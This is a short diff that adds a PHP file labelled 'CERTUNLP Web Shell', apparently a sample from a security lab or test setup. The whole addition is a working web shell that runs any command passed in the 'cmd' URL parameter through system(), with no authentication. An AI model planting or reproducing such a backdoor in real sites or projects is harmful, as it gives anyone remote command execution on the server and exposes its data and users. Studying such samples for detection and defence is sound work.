@@ -1,0 +1,6 @@
+<?php
+echo "CERTUNLP Web Shell\n";
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
